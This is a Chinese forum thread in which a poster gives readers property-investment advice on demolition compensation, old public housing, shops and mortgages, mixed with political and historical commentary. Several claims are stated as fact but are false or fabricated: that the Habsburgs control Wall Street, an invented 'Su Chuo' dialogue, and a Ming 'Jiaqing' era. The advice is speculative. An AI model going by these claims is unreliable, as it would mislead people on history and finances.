还没有听说10万的，反而是听说政府给你的补偿比市价二手房价格还低不少，如果没有拼死斗争的话 前段看新闻说是北京要控制拆迁成本，估计就是为了这一步压缩成本来着 把房买在zf边，差不了 yy45678： 楼主您好，想请教下，最近想买房，三线城市老住宅区（我们那里最早的商品房90年建的）附近一幢私房，上下二层半，120平一层,带地皮93年的房子，所有证件齐全，不好的是建在一个山坡上不能进车子。售价一起30W，另是城市新区，新市政府边，小区房。现在还很荒，什么都不方便,但环境很好。请问是买哪一个房子好？我们那里平均楼价2000左右。 kkndme： 2000一平的地方，好像算不上三线城市，大概应该是地级市或者县级市的房价。 一般来说房子买在市政府边上怎么也不会有问题，只要确定新市政府已经搬到你说的那个地方，该地的升值空间肯定是有的。但是如果仅仅是zf规划就要谨慎了，因为规划并不等于真的搬迁。 天子脚下：二手老房买得好，拆迁补偿少不了 旅行中，上个网是很不容易的事情。 关于拆迁补偿的事，巨大的利益驱使，那真是鲜血淋淋的。所以二手老房买在哪里很重要。银行的房、zf的房、各大部位的房，有上市交易的，买下来肯定不会吃亏。 存在风险的就是弱势群体聚居区。但是北京，毕竟天子脚下，不能搞得太僵，最终该补的还是会补到位，至于外省就很不好说了 3万入手北京四环，你也是幸运的 汝爱之罪： 北京七八十年代的砖混老房有体制内的，也有体制外的。现在公房上市流通，好多央产房也易主了，也许过个十年二十年的这批房子的产权证上早已换了一波又一波人。除非像楼主所说的昆明那种大型的省市公务员小区，房子新，户型好，环境和地理位置都不错，一般公务员没个20年轻易不会卖。 北京的这些老楼，不管谁是房主，肯定值钱，房子不值钱，位置还值钱呢。 至于这些房子使用寿命到了以后怎么处置，谁也说不清，能不能回迁，要看dfzf和规划局的利益。比如眼下金融街西侧月坛的老房子就要被集体拆除，连中学都要搬迁，这些西城人很有可能被撵到昌平回龙观西去，那边已经在建大批安置房了。 所以说，这些老房子不管是体制内的还是体制外的，命运如何不在自己手里。即使体制内的比较不错的老小区（比如三里河的建设部小区），如果牵涉到地方的利益，肯定也是毫不犹豫全部拆除，除非那里面住着实权人物当官的不让拆。这个时候就要看这些被拆迁户的谈判能力了，谈判能力强的，当个钉子户，当然是要得越多越好。 我以前买房的时候，也想了这些，不过最后还是买了新楼。现在因为地皮的价值，北京新老楼的房价差距不大，这个在别的城市是不可思议的。 很感谢楼主发这么一个帖子，版主还给了个绿脸，要不然可能就错过拜读的机会了 其实有些问题平时自己也在思考，比如GDP为什么保八，房价和滥发纸币等等，但是关于炒房和房租这一块，思考的并不多，而楼主的帖子比较有条理和逻辑的分析了这些方面，真的是很感谢，我甚至不用自己写分析，只要把楼主的帖子稍微整理，就是一篇很不错的分析资料了。 关于zf收紧口子，抬高小老百姓炒房门槛这一块，天涯房观有几个高人和楼主的看法一致。我细细想了一下，这个提高首付到50%的政策，确实会成为长期政策保持下去，而其实即使没有这个政策，稳健型的小老百姓也会掂量自己的钱袋买房。没有谁想断供，因为刚需需要房子。 至于以后十年甚至更长时间，房价仍然会涨。因为城市的发展离不开勤劳的人民，zf在不断的修建地铁画大饼，就是为了土地能卖个好价钱，只有不断的卖地搞铁公鸡，才会有gdp，才会有政绩。统治阶级带着他的各种利益集团一起玩，而老百姓以后可玩之物会越来越少，只能老老实实的干活挣钱。 由于家人的优柔寡断和缺乏对北京房地产现实的认识，我直到今年初才在四环买了第一套房，3w多的均价，让家里背负了100多w的债务。我错过了07年1w的机会，和09年1w+的机会。世上没有后悔药，历史也不会重演，那些07年买房和09年买房的人是幸运的。我现在努力攒钱挣钱的同时，最希望看到的事情居然是房价尽快远离我的成本区，我知道没有买房的同学一定会抨击我这种想法，但是现实就是这样可笑，一方面希望房价能降，这样可以把老人接到身边，另一方面又希望房价涨，这样自己在还贷的时候心里稍微能好受点。呵呵，不知道自己这样是不是活得太累。 不管怎么说，希望大家都能住上自己称心如意的房子，这几年来，zf真把我们这些人折腾的够呛。我和家人都是传说中的体制内，体制内确实有福利，可惜要想自己的财富不缩水，还得靠自己。 君为贵，商人、技工次之，农民为轻，打工人为底 傻子也疯狂： 今天看到新闻 什么房产市场回暖啊 温州炒房团又出江湖了 成交均价上涨啊 请问这个是真的吗，房价会在短时间涨上去吗 如果是真的，那中央调控有什么用，在没有下降的基础上再涨10% 不是自己打自己嘴巴吗 很想听听楼主怎么看待这个事情。 kkndme： 维持在正常成交量，保持一个缓步上涨的趋势，是zy最愿意看到的。因为zy很清楚，除非体制上有大动作，否则让房价下跌只是唱给人听的口号。体制是不能动摇的根本，是国家稳定的基础，高房价是体制造成的必然结果。zy很清楚，最好的方式就是以一个平缓的速度增长。但是决策者是不是有此能力控制房价缓慢上涨，这是值得仔细研究的。 任何一个朝代，即使是我们在电影里常看到的奸佞当权，往往政策的初衷都是好的，但是执行效果却常常适得其反，领袖的智慧与执政能力对国家的命运起着至关重要的作用。 明朝朱厚照时期有个太监刘瑾，权势一手遮天，是个典型的奸佞。但他其实是很想做点事情的。 明朝开国时，朱元璋搞了个戍边屯田，相当于现在的军垦，因为军队自给自足，给国家省了大笔的银子。但是到了后来，军官们都变成了大地主，霸占了士兵的土地，把士兵当作佃农，依靠盘剥士兵来实现让一部分人先富起来的号召。这是与杀良冒功、贪吃空饷并列齐名的第三大快速发家致富手段。 我们说了刘瑾是个有雄心壮志，很想做点事业的高责任心人士。对于军官霸占士兵田产导致士气低下这件事很看不惯，很不满意。决定坚决打击这种行为。于是下令地方zf 清理军官霸占田产的问题。 军官霸占的田产不仅仅是士兵的，更多的是当地老百姓的。 按理说，这应该是个老百姓叫好的政策，而事实上这是老百姓头上的噩梦。 执行人是谁？地方官。 地方官执行的时候就实在为难了，军官老爷手里都是握着重兵的，你上门还没开口，兵大爷的刀已经架在脖子上了。可是刘瑾刘老板下达命令的同时，还是要下达任务指标的，没收的田产有任务指标，以前军官老爷占有的田都不交税，既然清理田产就要交税，交税也有任务指标。 有些地方官比较聪明，不敢找军官大爷收，就摊派给了老百姓，结果老百姓又交田又交税，自然是连活路都没了。有些地方官脑子不清醒，真的跑去找军官老爷要田要税，结果造成军官勾结宁王造了反，最后刘瑾自己的脑袋也保不住了。 历朝历代，统治者代表的都是地主阶级的利益。历朝历代的改革都只是为了缓和底层群众与地主阶级的矛盾，防止因为过激发生极端群体性事件。 调控也是为了缓和矛盾，要温水煮青蛙，而不要一把火把青蛙烧死。 关于自己打自己嘴巴的事，那是太多了，自古以来，统治者也从来不怕自己打自己嘴巴。古人就总结过，只准州官放火，不准百姓点灯。 以前的科举制度与现在的公务员考试制度基本目的都是相同的，让全天下的优秀的和不优秀但有出身的知识分子依附于官，这样就有了绝对的话语权。无法进入体制内的知识分子，有商业头脑和技术专长的人员，就相当于过去的商人、小作坊主，尽管也许还算富裕，但是没有任何地位，任人支配。要是没有一技之长，又不能经商，就基本上在社会的最底层很难翻身，相当于过去城市里的贩夫走卒，甚至无片瓦立锥，糊口都是困难，地位和稳定性反而远远不如自给自足，拥有宅基地的农民 中年不惑吗： 说到底空空太幼稚了 当年拖拉机之夜太学生怎么也想不到机关枪和拖拉机真的会招呼到自己身上 这和他们从小接受到的教育不一样 呀 主流宣传中party妈妈都是慈祥的温柔的全心全意为p民服务的 有皇帝大力支持的王安石变法到了地方法令也大变味 如今虎温的威权要远远小于当年的宋神宗和王安石 而且统治阶层从上到下的改革从来是为了巩固统治地位 至于p民收益那从来都是附属作用 kkndme： 这就是中西方的不同，西方的拖拉机是对外的，中国的拖拉机从来对的都是p民，对外基本比较忪。所以才有元和清，明明是外族入侵灭了国，还要把蒙古人和女真人一起拉进来统一叫中华民族，居然认为中华民族很强大，元朝时一直打到亚得里亚海。也不管蒙古人跟中华的两河文明有关系没有。 10年的调控和08年调控的区别、带来的影响、机会 这次调控与08年调控后的结果是有所区别的。08年调控的结果是一线城市的暴涨；而2010年调控的结果是房价以二三线城市为主的全面上涨。不但是二三线城市，高房价甚至已经传到至四线及以下城市。 在二三线以下城市，无房户的需求其实并不大，真正的刚需来自改善性住房。城市升级使人们开始不满足过去老旧式住房的居住环境，开始追求大盘大开放商的品质住宅。房价也由此迎来全面上涨。这种全面上涨，不能理解为全面泡沫，而是有基础存在的。不能理解为全国炒房。特别是四线及以下城市尽管新盘价格高涨，老旧住宅却乏人问津，县级市二手房变现也比较困难。在2010年的调控的大背景下，却神奇的出现了二三线以下城市的刚需大量释放现象，不得不令人叹为观止。这神秘的幕后推手其实就是资金的规律。 对于在2010年初布局二三线城市的房开商和有远见的投资者，在这次调控中，无疑是受益者。 一线城市，这次调控给刚需买房者一个最好的入市良机，但是能够抓得住的只是少数。 历史总是惊人的相似 汝爱之罪： 其实，几千年来，唱的都是同样的戏，只不过台上的演员变换而已。 kkndme： 赞赏这一句，呵呵，历史规律是不变的，变化的只是时间、地点、人物、事件。 城头变换大王旗。 tjOOSAN： 历史规律是不变！但他妈世界变了！~~ 中国采用资本主义制度了 还只参考中国历史？ kkndme： 你知道什么叫资本主义制度吗？ 首先基础是三权分立。 早在1748年，孟德斯鸠男爵发表了伟大的划时代的巨著\"论法的精神\"明确提出了三权分立。奠定了资本主义制度的基础。三权分立制度就是国家的立法、行政、司法三权分别由三个机关独立行使，并相互制衡的制度。讲的是法律精神，讲得是私人财产神圣不可侵犯。 而作为一个人治而非法制国家，怎么能说是资本主义呢？ 建议个别（tjOOSAN）不读书，不研究，不了解中西方历史，不懂经济，对社会制度基本的理解基本是个白痴的同志，就不要乱发表议论了，惹人笑话。 无论是中国还是西方历史对现在都是很有借鉴意义的。这就使毛说过的\"古为今用，洋为中用\"，毛建的武装斗争及建国思想其实很大程度来自于朱元璋。 古代君主统治国家征服世界靠战争武器，现在则靠金融武器。 西方，我们所熟悉的具备最纯正贵族血统的哈布斯堡家族，曾经的德意志王国和神圣罗马帝国的统治者，家族成员曾经统治过欧洲诸国：包括波希米亚王国 、匈牙利王国 、克罗地亚及斯洛文尼亚王国、伦巴第及威尼斯王国 、奥地利皇室领地 、萨尔茨堡公国 、塞尔维亚及塔米斯-巴纳特公国等等无数欧洲国家。 而现在，哈布斯堡家族控制着华尔街，继而通过华尔街控制着全球的经济。 历史是在继承的前提下发展的，特别是在西方，现在几乎每一个显赫的家族都能追根溯源。因为尽管西方也发生大革命，但是象文革一样彻底否定历史是完全不可思议的。 我们有点英雄情结的人听到最多的西方中世纪十字军三大骑士团：圣殿骑士团、条顿骑士图案、医院骑士团；直到现在仍有两大骑士团存在。条顿骑士团总部现在还在德国，专门从事慈善事业。医院骑士团后来改名为马耳他骑士团，也就是现在的马耳他，世博会还来上海参展。只有圣殿骑士团灰飞烟灭，但现在仍有大量的修士组织自称为圣殿骑士团的继承人。 完全不懂历史，就等于完全不懂得社会。 关于房贷 四环四环： 同意LZ。 刚刚父母帮忙首付、自己还贷，在北五环边买了个小房。 判断依据非常简单：一个是国家政策和我等屁民生活是两岔儿的，既然移民无望，就赶快站队；一个是力所能及、负担得起。 07年底和09年底都错过了机会，也是当时条件不允许，一次是自己嫌弃燕郊太远；一次是嫌弃通县太远。完后工作逐渐稳定，一狠心安了家，剩下的就是往体制外金字塔中层挤吧。 LZ所说，正是我说不清楚、但能判断大概的那些事儿。 哈哈。 请教LZ： 眼下商业贷款贷款46万。 分20年还，月供3066 分30年还，月供2562 朋友劝我贷款时间越长月供越少越好。 直觉判断我觉得也是这样。 有科学依据么？ kkndme： 你的朋友考虑是有道理的。 如果不考虑通货膨胀，当然是利息越少越好，20年还的利息要少于30年还的利息。 但是因为通货膨胀的因素，我国是高增长高通胀的国家，每年的通胀率远远大于实际公布的数字，更远远高于贷款利息，所以贷款时间越长越好。 至于月供是否越少越好，完全取决于个人的承受能力，有条件当然买大房子，宁肯月供多一点。但是条件不够就买小的，量力而行。 四环四环： 谢谢楼主指点。 假设通胀率有一个固定值（当然实际这是没有的，它也是个取决于经济规律和国家意志的不确定因素）、贷款利息有一个值。 完后不同的贷款年限。 就能估算出两个值此消彼长。 需要选择判断的是，通胀率这个值的数字。 但通过对国际意志不确定因素极端情况的估算，预计这个值。 完后把这变成一个数学题。 是这意思么？ 那不用算了，按常识，知道该怎么选了。 kkndme： 银行贷款的年限越高，利息支出越高，但不会高过通胀。你能贷30年就贷30年，这是你年轻的优势。年纪大点的就只能贷25年，甚至20年了。 所以说40岁买房的人很不靠谱，首先40岁的人不一定有钱，反而错过了最敢买房的黄金年龄。其次是40岁贷款年限就短了好多，相当于月供压力更大了。 买卖商品房会逐渐变成富人的游戏 以后，商品房本来就变成了富人间的游戏，普通人将不能卖进参与的门槛。 到多数人真的买不起房时也就安心了，也不用关心房价的涨跌了。 但是现在，房价还没有到那个高度，很多人还觉得有希望，所以对房价的涨跌才会特别关注。这个时期应该就是普通人最后买房的机会。错过了，将不会再有。 zf还是更在意农民问题 肖肖19850706： 楼主虽然有很多观点写的很有道理，但是对于历史这块，并不太正确 引用一段楼主的话： —————— 自古以来，民生问题的底线就是不要出现陈胜吴广的极端情况。所以zf更在意的是农民问题。 因为历史的改朝换代都是大饥荒引起的，无论是汉末、唐末、隋末、还是明末。农产品价格上涨的对zf的震动要远远大于房价的上涨。 农民具备最原始的力量，而他们关心的并不是三线以上城市的房价，而是能否填饱肚子。 而关心自己能否拥有一套产权房的都市白领，除了呻吟一下意外，几乎是没有什么有效反抗的可能的。 —————— 其实在当今政权建立之前，还有一个政权，叫做中华民国 这个政权是由民主革命带来的 他们所举的旗帜是资产阶级革命，所建立的政权是资本主义社会 为什么会失败？ 这是一个值得思考的问题 让一个经历了5000年封建社会的国家经过一次革命就达到资本主义社会的境界 没有工业革命的基础 没有原始的积累 有的只是借鉴西方 想先变制度再进行调整，结果固然是失败 于是\"农民起义\"卷土重来，我想大家肯定明白\"农民\"所指的是什么 于是又了现在的这个政权 由工人阶级和资产阶级去推翻帝制 再由农民阶级把土地抢回来，最终回到封建政权来压迫资产阶级 他们最怕的还是农民么？ 显然不再是了 他们最怕的正是资产阶级 其次就是你说的那些 \"关心自己能否拥有一套产权房，除了呻吟一下意外，几乎是没有什么有效反抗的可能的都市白领\" 攻占巴士底狱的不是农民 正是这些\"几乎没有什么有效反抗可能的都市白领\" 是工人阶级结束了地球上长达上千年的封建统治 而改革开放，市场经济的发展，给了这一切充足的物质基础 社会的转化过程有两种 一种是和平演变 一种就是革命 现在所存在的问题，不是他们更怕谁 而是他们选择面对哪种演变方式 kkndme： 最可怕的不是农民而是失去土地的农民。 为什么说新民主主义革命是工人阶级领导的？ 那时的工人阶级是什么？就是失去土地的农民和破产的手工业者，除了体力一无所有，所以他们才具备脑袋掖在裤腰带上，为了抢土地而玩命的动力。解放战争时期，我军的宣传就是：\"同志们，国民党要把分给你们的土地抢走，你们说怎么办？\"于是广大失去土地的农民兄弟不干了，玩命了。 工农红军一四方面军胜利会师，在选择南下和北上发生了分歧，真的为了北上抗日吗？1935年抗日战争还没有打响，日本人在东北而不是西北。北上抗日的说法实在有些牵强。 我想真正的原因还是群众基础。 近几年多次在西南地区的乡村进行田野调查，发现一个问题：解放前，即使如贵州山区的偏僻乡村，农民自给自足吃饱肚子是完全没有问题的，更别说富庶的四川平原。 那时参加红军要有不要脑袋的玩命精神，对于多数能够填饱肚子的农民来说，主动参加革命显然是不现实的。红军在西南地区完全没有群众基础，战斗中的减员得不到有效的补充，所以人才会越打越少。 而西北地区完全不同，自然条件恶劣，农村耕地很少，存在大量食不果腹，无地可种的农民。李自成起义也是从陕西发起的，可以说具备了随时发动武装暴动的群众基础。所以毛选择了北上的正确路线。而张同志南下凄惨的下场印证了毛的正确判断。 北上延安的另一个重要原因是获得苏联的支持，没有强大的后援是无法取得决定性胜利的。 一旦农民失去了土地，而又没有去处，那是相当可怕的，所以农民工就业问题是zy最为关注的。甚至提出如何让农民工在城镇买房子置业，处理好农民问题，是社会稳定的重中之重。 将来，有地可耕的农民将会成为都市中的底层群众羡慕的对象，农民有地有住宅有粮食。进可以在城市打工，有聪明的甚至通过经商迈进富人阶层，退可以回乡种田，虽然现钱不多，但是吃穿住行都是没有问题的。 而真正一无所有的将是大量在都市中沦为贫困的人群。在打拼挣扎的打工仔，如果没有能力购置房产，也没有得到向上爬的机会，在都市立足将变得困难，而又毫无退路。 治国需要用贪官、反贪官 讲个故事，可能这个故事很多人都看过，并且曾经多次被转帖： 宇文泰是北周开国的奠基者。当他模仿曹操，作北魏的丞相而\"挟天子令诸侯\"之时，遇到了可与诸葛亮和王猛齐名的苏绰。宇文泰向苏绰讨教治国之道，二人密谈 三日三夜。 宇文泰问：\"国何以立？\" 苏绰答：\"具官。\" 宇文泰问：\"如何具官？\" 苏绰答：\"用贪官，反贪官。 \" 宇文泰不解的问：\"为什么要用贪官？\" 苏绰答：\"你要想叫别人为你卖命，就必须给人家好处。而你又没有那么多钱给他们，那就给他权，叫他用手中的权去搜刮民脂民膏，他不就得到好处了吗？\" 宇文泰问：\"贪官用我给的权得到了好处，又会给我带来什么好处？\" 苏绰答：\"因为他能得到好处是因为你给的权，所以，他为了保住自己的好处就必须维护你的权。那么，你的统治不就牢固了吗。你要知道皇帝人人想坐，如果没有贪官维护你的政权，那么你还怎么巩固统治？\" 宇文泰恍然大悟，接着不解的问道：\"既然用了贪官，为什么还要反呢？\" 苏绰答：\"这就是权术的精髓所在。要用贪官，就必须反贪官。只有这样才能欺骗民众，才能巩固政权。\"宇文泰闻听此语大惑，兴奋不已的说：\"爱卿快说说其中的奥秘。\" 苏绰答：\"这有两个好处：其一、天下哪有不贪的官？官不怕贪，怕的是不听你的话。以反贪官为名，消除不听你话的贪官，保留听你话的贪官。这样既可以消除异己，巩固你的权力，又可以得到人民对你的拥戴。其二、官吏只要贪墨，他的把柄就在你的手中。他敢背叛你，你就以贪墨为借口灭了他。贪官怕你灭了他，就只有乖乖听你的话。所以，‘反贪官 '是你用来驾御贪官的法宝。如果你不用贪官，你就失去了‘反贪官'这个法宝，那么你还怎么驾御官吏？如果人人皆是清官，深得人民拥戴，他不听话，你没有借口除掉他；即使硬去除掉，也会引来民情骚动。所以必须用贪官，你才可以清理官僚队伍，使其成为清一色的拥护你的人。\" 他又对宇文泰说：\"还有呢？\" 宇文泰瞪圆了眼问： \"还有什么？\" 苏绰答：\"如果你用贪官而招惹民怨怎么办？\"宇文泰一惊，这却没有想到，便问：\" 有何妙计可除此患？\" 苏绰答：\"祭起反贪大旗，加大宣传力度，证明你心系黎民。让民众误认为你是好的，而不好的是那些官吏，把责任都推到这些他们的身上，千万不要让民众认为你是任用贪官的元凶。你必须叫民众认为，你是好的。社会出现这么多问题，不是你不想搞好，而是下面的官吏不好好执行 二线城市典型代表 klid： LZ 成都属于您口中的二三线城市么？ 那么这次属于补涨阶段？ kkndme： 成都、重庆、西安、昆明、武汉都是二三线城市的典型代表。 关于商铺和住宅投资 马甲马甲_马马甲： 请教楼主： 因为种种原因， 错过了很多买房的好时期，现在租房住，（ 享受到了朋友提供的体制内的好处， 远低于市场价格租了一套房子）。 手上200万左右的现金， 在上海，想买房子保值增值， 1，有套著名大学附近的二手房子，57平米， 130万左右，估计租金大约是2.5万-3万 之间， 2，在市中心成熟的商业区有个店铺， 124万， 年租金现在是6.4万一年。 2个选择，个人倾向于投资店铺， 因为在上海店铺的涨价远远低于住宅的涨幅，况且店铺的资金回报率也达到了 5% ，不知道楼主是否有更好的建议？ kkndme： 很多人不愿意投资商铺还是在于风险大，好位置熟铺是很少有人愿意拿出来卖的，谁愿意放弃生蛋的母鸡呢？而新开发的商铺要不然位置比较偏，不知道能不能做的起来，要不然就溢价太高，超出了大多数人的承受。好的商铺是市面上很难买到的。 如果经过考察确认商铺没有问题，还是首选商铺，但是一定要经过认真的考察。 而住宅的风险就相对小多了，而且投资不需要很多的经验，更适合一般投资者。 关于房产调控 tianxiaobing11： 请问楼主，房价会在年底重新确立上涨趋势吗？如果再不涨，政府的地卖不上好价钱，地方财政就回吃紧，地方政府还会像去年那样出各种政策救市吗 九五二七八： 全国各地 一线二线三线 情况都有不同 楼主预测时点 怕不好预测啊 kkndme： 不但是不同城市情况有区别，同一城市的不同区位情况也有区别。就拿北京来说，过渡爆炒的通州房山等远郊区县，房价一定会有所回调，但是城市中心，特别是学区房是没有下降可能的。 而对于多数二三线城市，均价下降的原因主要还是远郊区的房源投放量增加，城区内的房子不但不降，而且涨得还很厉害。 房产投资最重要的还是位置，当远郊区县的房价远低于城中心的时候，一定会有补涨的要求，但当远郊区县的房价向城中心接近的时候，一定会出现城中心的补涨，当然在调控期也会体现为远郊区县房价的回调。 kkndme： 仔细看一下各地的房价，不要被公布的所谓均价迷惑，只有少部分城市价格下降或者持平，多数城市都在上涨，只不过幅度不大而已。现在成交量属于正常水平，不存在dfzf吃紧的问题，当然不可能象09年那样的疯狂，09年底甚至银行出现无款可贷，太高的成交量会被zy视为危险的信号，是达到危害金融安全的高度的。 关于房产税 tianxiaobing11： 还有一问题请教楼主，目前我一共有三套房，一套自己住，一套父母住，一套是投资房，在大连最繁华的地方，租金回报是百分之六点五，请问房产税会很快推出吗？我的那套投资房是卖掉还是持有呢？卖的话能赚白分之五十 kkndme： 在卖掉之前，你要先问问自己，拿这笔钱打算干什么？如果没的可做，干等着贬值，那你为什么要卖呢？ 如果你有更好的投资或者创业渠道，那当然立刻卖掉，不用犹豫。 至于房产税，第一：近两年一定不会征收，因为条件还不成熟。第二：房产税只是一项苛捐杂税，目的是补充财政收入，并没有降低房价和租金的功能，并且只能导致租金的上涨。怕房产税的应该是租客，而不是房东。 任何税种最终都要转嫁到社会最底层群众身上。丛林法则实际就是大鱼吃小鱼，小鱼吃虾米。 上层人士的享受是靠底层群众勒紧裤腰带过日子换来的。 老公房的拆迁问题 wofuleyumin1： 从头至尾，一口气看完了。。赞同之极。。。 也向楼主问些问题。。。 是否老公房都会拆迁？ 在成都，一环，二环内还有非常多的老公房，总量比商品房还多，这么多的房子都会拆迁吗？ 我在想是否先买套老公房。。因为价格也便宜。新的商品房一般八九千。。老公房才5千多。买了后灯拆迁。 但这么多老公房都会拆迁吗？我觉得可能很多房子是不会拆迁的吧？否则只要现在买这些房子，以后都发财了。 是否拆迁的只是很少部分？ kkndme： 将来多数房都会拆迁，这是中国体制和经济发展模式决定的。在城市拆迁改造升级过程中，大量的老房拆毁，大量的新房拔地而起。而随着拆迁改造的成本的上升，房子也越来越贵。 现在拆迁改造集中建设70-90的小户型，将来会沦为新的城中村，通过二手置换，这类房子会变成新的贫民窟，而将来的拆迁改造建设的一定是追求环境品质的大户型。 因为zf官员任期的限制，决定了官员的短视，决定了城市规划的短视。 但是市中心的房子，即使在将来人口下降的过程中，仍然是稀缺的，房价高不可攀的。如果手有余钱首选的是市中心的大户型。 关于市中心老旧二手房的购买，还是有一定学问的，一定要选择位置好，低密度的矮层住宅楼，因为密度低，便于拆迁。而密度高的塔楼拆迁非常困难，拆迁成本太高，开发商很难有利可图。现在住在市中心高层旧式塔楼的富裕人口，将来一定会二次置业，这些旧式塔楼逐渐会沦为新一代年轻中产阶层的过渡性住房。 投资新房还是老公房 wofuleyumin1： 楼主。。谢谢你的答复 我接着问 你说现在投资是投资一套新房好，，还是找个老公房投资？ 新房，，一切都好，但价格贵。。 老公房，一切都不好，但价格便宜。。主要是等拆迁。。但可能要等七八年。。（从我近2年的观察，一般都要这么久。。除非有内部消息） kkndme： 有钱当然是新房舒服。 老公房如果是学区房，随着住着不舒服但是不影响小孩上学。至于啥时拆迁那真是有年头等了。运气好，三年五年，运气不好十年八年。 关键是拆迁后，原地回迁是很难的，拆迁后安置一般都到远郊区县。如果碰上个铁腕书记，拆迁还真不见的能得什么便宜。条件还没谈好，推土机就开来了。 wofuleyumin1： 有钱当然是新房舒服。 老公房如果是学区房，随着住着不舒服但是不影响小孩上学。至于啥时拆迁那真是有年头等了。运气好，三年五年，运气不好十年八年。关键是拆迁后，原地回迁是很难的，拆迁后安置一般都到远郊区县。如果碰上个铁腕书记，拆迁还真不见的能得什么便宜。条件还没谈好，推土机就开来了。 。。。。。。。。。。。。。。。。。。。 楼主的意思是。。还是投资新房比较好？ kkndme： 还是量力而行，买老公房也比不买强，有条件当然买新房。 高端盘有房价带动作用 wofuleyumin1： 楼主。。。又有一个问题 我附近的普通房子大概9000 旁边有个02年的别墅现在13000 现在又有一个新的楼盘开盘了。。是电梯 容积3 十多层的 是中海的高端项目，装修过的 居然卖将近2万。。。离谱吗？旁边容积0.8的老别墅才13000啊 请问中海这个项目是否价格过高？ 另外，这个项目对我这附近的房价能拉动多少？ kkndme： 高端房产，开发商都是不急着卖的，而且也从来不乏有钱人慷慨解囊。你说的情况跟昆明的空间俊园完全相同。在市中心徘徊在万元关口的时候，空间俊园直接开出了19000的均价，之后市中心的二手房紧随攀升到15000.而一环二环间的房价在万元关口徘徊。 大盘高端盘对房价的带动作用是显而易见的。 自调控刚刚推出的时候，与一个朋友闲聊，说起调控将是二三线城市大涨的机会，还聊了聊昆明的发展，结果那个朋友头顶调控的大棒，去昆明投了n套房产，当时价格7000多点，时过几个月，现在看房价已经涨到9000.而且他买的位置周边先后有高端大盘推出，预计开盘价格在12000-15000，一旦高端大盘开盘将让他买的房子直接迈上万元的台阶。 买房和没买房的差距 汝爱之罪： 新穷三代。。。ORZ 我可不想做穷一代。。。。 房子真的让人抓狂，当跟你同样起点的人早你三年买房的时候，这种感觉尤为明显。 我老公是77年的，他一个女同学2007年底在清河新城买了一套房，一百多平100多万吧，找家里东拼西凑的全款。其实当时我老公也能拿出100w不用借钱的，可是他偏不听我的话，认为清河在五环外，那种地方还要100多万不可思议。结果北京经历了09年的疯狂以后他同学那套房子已经翻倍，借的钱也已经还清。 而我们呢，在犹豫和老公的优柔寡断中错过了时机，终于在2010年3月最疯狂的时候入手了，这时候即使首付160多万，还要背负100多万的贷款，生活质量比他的女同学差的不是一点半点。 这是真实发生的事情，犹豫和无知真的能让人付出很大的代价。 kkndme： 清河新城好像是50年产权吧。反正我对50年产权的都不感冒。 我一朋友06年买的水木天成，买时5000多，现在25000，调控都不带降价的。 汝爱之罪： 清河新城盘子还是很大的，分好几期，有70年也有50年，他们买的是70年的。07年底刚开第一期，相当于股市里的打新股了，基本上没什么风险。 房产交易历史 最早的房产交易，出现在一个名字叫\"盉\"的西周青铜器上。在公元前919年农历三月份，一个叫矩伯的人分两次把一千三百亩土地抵押给一个叫裘卫的人，换来了价值一百串贝壳的几件奢侈品，包括两块玉，一件鹿皮披肩，一条带花的围裙。 周厉王三十二年又发生了一宗土地买卖。这宗土地买卖的交易过程也被刻在青铜器上。 这次记录的是周厉王买地的事，周厉王为扩建王宫，买下一个叫鬲从的人的地，没有立即给钱。鬲从担心周厉王赖账，周厉王派人对鬲从说：\"你别怕，我一定会照价付款的，如果我赖账，就让上天罚我被流放好了。\"这是个很毒的誓。 周厉王买地花了多少钱，铭文上没写。不过李开周说，有人买地，有人卖地，说明当时除了有土地抵押，还存在土地买卖，房地产市场已经有了雏形。 隋唐时，有个叫窦乂的人，他生在陕西，很小的时候就死了爹娘，无依无靠，跟着舅舅一块儿生活。 他舅舅是个公务员，住在长安城。窦乂先通过卖鞋、卖树等生意赚了一些钱，后来有了80万钱的身家，于是开始向房地产行业进军。 当时长安西市有一个废弃的化粪池，面积不小，有十几亩，闲置七八年了，一直没人买。窦乂把它买了下来，雇人填平，在上面盖了20间店铺，租给波斯胡人做生意，平均每天都收上来几千钱的房租。 再后来，窦乂听说当朝太尉李晟喜欢打马球，于是斥资70万钱买下一块地，又花30万钱把这块地建成一片马球场，送给了李晟。 李晟很高兴，从此跟窦乂结成死党，有求必应。有这种靠山保驾护航，窦乂发得更快了，不到40岁就成了长安首富，人称\"窦半城\"。 除了像窦乂这样的开发商，古代的业余开发商还有一些是公务员、退休干部等，甚至官府自己就是开发商。 比如在北宋，中央政府下面就有个专门搞开发的机构，叫做\"修完京城所\"。这个机构本来只能是修筑城墙和宫殿，后来城墙修得差不多了，宫殿也盖得够豪华了，这个机构就开始转型，开始给中央财政搞创收。 怎么搞创收呢？修完京城所向朝廷请示，划拨给他们大片地皮，他们在上面盖住宅盖店铺，盖好了，有的卖给老百姓，有的赁给老百姓，给国库做了很大贡献。 古代是没有专业的开发商的。做开发商最需要的是钱。买地、买建材、雇人、摆平关系，哪个环节都得花钱。尤其买地，流动资金不能少，钱不够，就得找同行拆借，或者找银行贷款。 古代没有银行，但有钱庄，可是钱庄规模一般很小，即使有一些大型的全国连锁的钱庄，他们也不做开发商的生意，都把钱借给别的老板了。 史料上有这样两个办理房地产抵押贷款的例子，一个是南北朝时候的梁朝郡王萧宏，让人家拿着房契去贷款，一张房契最多只贷给几千钱；还有一个是明朝嘉庆年间山阴县的一个富户，名叫求仲，最多的一次才贷给15000文。这点儿钱别说搞开发，吃一顿大餐都不够。 直到民国时期，外国银行纷纷到中国开展业务，开发商们才能贷到大笔的贷款。所以中国的职业开发商直到民国才出现。 古代开发商如果大量囤地得挨板子 以唐朝为例。唐玄宗在位时，土地政策里有这么一条：\"应给园宅地者，良口三口以下给一亩，每三口加一亩，贱口五口给一亩，每五口加一亩，……诸买地者不得过本制。\"意思就是说，政府给老百姓划拨宅基地，划拨的宅基地大小取决于家庭等级和家庭人口，如果是平民家庭，每三口人给一亩宅基；如果是贱民家庭，每五口人给一亩宅基。另外老百姓也可以购买宅基，但是购买的面积有限，不能超过政府规定的指标。 政府规定的指标是多少呢？平民家庭买地，每三口人，最多只能买一亩宅基；如果是贱民家庭买地，每五口人，才能买一亩宅基。 在唐朝，商人也属于贱民，再有钱的商人也是贱民，贱民老板去买地，即使是上百口人的大家庭，最多也只能购买20亩地，用这20亩地搞开发，一两年就倒腾光了。而如果超标大量买地会怎么样呢？ 唐朝法律规定：\"诸占田过限者，一亩笞十。\"意思是买地超过指标的，得挨板子，每超出一亩指标，挨10大板。 